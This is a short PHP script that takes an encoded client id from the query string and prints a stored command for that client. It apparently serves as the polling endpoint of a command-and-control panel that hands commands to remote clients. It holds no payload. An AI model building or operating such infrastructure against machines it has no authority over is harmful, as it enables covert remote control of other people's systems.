<?php
include_once 'classes/Database.php';
include_once APP_PATH . '/classes/Clients.php';
include_once APP_PATH . '/classes/Utils.php';

$utils = new Utils;

try {
    if (isset($_GET['id'])) {
        $client = new Clients;
        $clientCommand = $client->getCommand($utils->sanitize($utils->base64_decode_url($_GET['id'])));
        if (property_exists($clientCommand, "command")) {
            echo $clientCommand->command;
        }
    }
} catch (Exception $ex) {}
